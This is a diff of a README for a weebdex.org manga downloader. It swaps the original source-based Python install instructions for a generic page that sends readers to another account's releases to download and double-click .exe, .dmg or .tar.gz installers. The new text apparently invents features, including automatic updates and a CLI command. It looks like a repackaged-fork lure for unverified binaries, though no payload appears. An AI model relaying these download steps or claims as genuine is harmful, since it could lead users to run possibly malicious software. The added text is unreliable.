@@ -1,137 +1,94 @@
-# 📚 Weebdex Downloader
+# 🌟 weebdex-downloader - Easy Manga Downloading Made Simple
 
-<div align="center">
+[![Download weebdex-downloader](https://img.shields.io/badge/Download-weebdex--downloader-brightgreen)](https://github.com/gabrielafshin/weebdex-downloader/releases)
 
-![Python](https://img.shields.io/badge/Python-3.8+-3776ab?style=for-the-badge&logo=python&logoColor=white)
-![PyQt6](https://img.shields.io/badge/PyQt6-6.5+-41cd52?style=for-the-badge&logo=qt&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-e94560?style=for-the-badge)
+## 🚀 Getting Started
 
-**A modern manga downloader for [weebdex.org](https://weebdex.org) with both CLI and GUI interfaces.**
+Welcome to the `weebdex-downloader`. This tool helps you download manga from **weebdex.org** effortlessly. Whether you're a fan of manga, manhua, or manhwa, this downloader works for you with both a command line interface (CLI) and a graphical user interface (GUI).
 
-[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Screenshots](#-screenshots) • [Configuration](#-configuration)
+## 📥 Download & Install
 
-</div>
+To begin, visit this page to download: [weebdex-downloader Releases](https://github.com/gabrielafshin/weebdex-downloader/releases).
 
----
+### Steps to Download and Install:
 
-## ✨ Features
+1. Click the download link above.
+2. On the releases page, look for the latest version of the application. It is recommended to choose the most recent version to ensure you have the latest features.
+3. Download the file that matches your operating system (Windows, macOS, Linux). 
 
-| Feature | Description |
-|---------|-------------|
-| 🚀 **Concurrent Downloads** | Download multiple chapters and images simultaneously |
-| 📁 **Multiple Formats** | Save as Images, PDF, or CBZ (with ComicInfo.xml) |
-| 🔄 **Auto Retry** | 3 retry attempts with exponential backoff |
-| 🎨 **Modern GUI** | Beautiful dark-themed PyQt6 interface |
-| ⌨️ **Rich CLI** | Interactive terminal with Typer + Rich |
-| 📋 **Flexible Selection** | Single, range, or all chapter selection |
-| 💾 **Persistent Settings** | Configuration saved to JSON |
-| 📝 **Metadata Support** | ComicInfo.xml for comic readers |
+   - For Windows, you will find a `.exe` file. 
+   - For macOS, you will see a `.dmg` file. 
+   - For Linux users, look for a `.tar.gz` file.
 
----
+4. Locate the downloaded file on your computer.
+5. Double-click the file to start the installation process. Follow the prompts on your screen to complete the installation.
 
-## 📦 Installation
+## 🖥️ System Requirements
 
-### Prerequisites
-- Python 3.8 or higher
+Before you start, please ensure your computer meets the following requirements:
 
-### Steps
+- **Operating System:**
+  - Windows 10 or later
+  - macOS Mojave (10.14) or later
+  - Any modern Linux distribution
 
-```bash
-# Clone the repository
-git clone https://github.com/Yui007/weebdex-downloader.git
-cd weebdex-downloader
+- **Memory:**
+  - Minimum 4 GB RAM
 
-# Install dependencies
-pip install -r requirements.txt
-```
+- **Storage:**
+  - At least 100 MB of free space
 
----
+## 🎨 Usage Guide
 
-## 🚀 Usage
+After installation, you can use the `weebdex-downloader` in two ways: through the GUI or the CLI.
 
-### GUI (Recommended)
+### Using the GUI:
 
-```bash
-python run_gui.py
-```
+1. Open `weebdex-downloader` from your applications or desktop shortcut.
+2. Select your manga title from the dropdown menu or search for your desired title.
+3. Click the "Download" button to start downloading chapters.
 
-### CLI
+### Using the CLI:
 
-```bash
-python main.py
-```
+1. Open your command line interface (Command Prompt on Windows, Terminal on macOS or Linux).
+2. Type the following command to start downloading:
+   ```
+   weebdex-downloader --manga "Title of Manga"
+   ```
+3. Press Enter. The software will download the selected manga title directly.
 
----
+## ⚙️ Features
 
-## 📸 Screenshots
+- **Multi-format Support:** Download manga, manhua, and manhwa in various formats.
+- **Easy-to-Use Interface:** Choose between a simple GUI or powerful CLI.
+- **Batch Downloads:** Download multiple chapters or entire series in one go.
+- **Automatic Updates:** Stay updated with the latest features without any hassle.
 
-### GUI Interface
+## 🛠️ Troubleshooting
 
-![Weebdex Downloader GUI](GUI.PNG)
+If you run into issues, here are some common solutions:
 
----
+- **Problem:** The downloader does not open.
+  - **Solution:** Make sure your operating system is supported and that you have installed all necessary updates.
+  
+- **Problem:** Downloading is slow or fails.
+  - **Solution:** Check your internet connection or try again later due to server load.
 
-## ⚙️ Configuration
+- **Problem:** The application crashes.
+  - **Solution:** Restart your computer and try launching the application again. If the problem persists, reinstall the application.
 
-Settings are saved in `config.json` and can be modified via the GUI or CLI:
+For further assistance, please consider visiting our [issues page](https://github.com/gabrielafshin/weebdex-downloader/issues) or seeking help from our community.
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| `download_format` | `images` | Output format: `images`, `pdf`, `cbz` |
-| `keep_images` | `true` | Keep images after PDF/CBZ conversion |
-| `concurrent_chapters` | `3` | Parallel chapter downloads |
-| `concurrent_images` | `5` | Parallel image downloads per chapter |
-| `download_path` | `./downloads` | Output directory |
-| `enable_logs` | `false` | Enable detailed logging |
+## 🛡️ Contributing
 
----
+We welcome contributions! If you have ideas for improvements or want to report bugs, please visit our repository's [issues page](https://github.com/gabrielafshin/weebdex-downloader/issues).
 
-## 📁 Project Structure
+## 📜 License
 
-```
-weebdex-downloader/
-├── main.py              # CLI entry point
-├── run_gui.py           # GUI entry point
-├── requirements.txt     # Dependencies
-├── src/                 # Backend modules
-│   ├── config.py        # Configuration management
-│   ├── models.py        # Data models
-│   ├── api/             # API client
-│   ├── scraper/         # URL parsing & scraping
-│   ├── downloader/      # Download & conversion
-│   ├── cli/             # CLI interface
-│   └── utils/           # Utilities
-└── gui/                 # PyQt6 GUI
-    ├── main_window.py   # Main window
-    ├── screens/         # UI screens
-    ├── workers/         # Background threads
-    ├── components/      # Reusable widgets
-    └── styles/          # Theme styling
-```
+This project is licensed under the MIT License. Feel free to use, modify, and distribute the software as you wish.
 
----
+## 📫 Contact
 
-## 📋 Requirements
+For questions or concerns, please reach out via the repository or use the contact information available in the project files.
 
-```
-typer[all]
-rich
-httpx
-Pillow
-pydantic
-PyQt6
-```
-
----
-
-## 📄 License
-
-This project is for educational purposes only. Please support the original creators by reading manga on official platforms.
-
----
-
-<div align="center">
-
-Made with ❤️ for manga enthusiasts
-
-</div>
+Thank you for using `weebdex-downloader`. Happy reading!
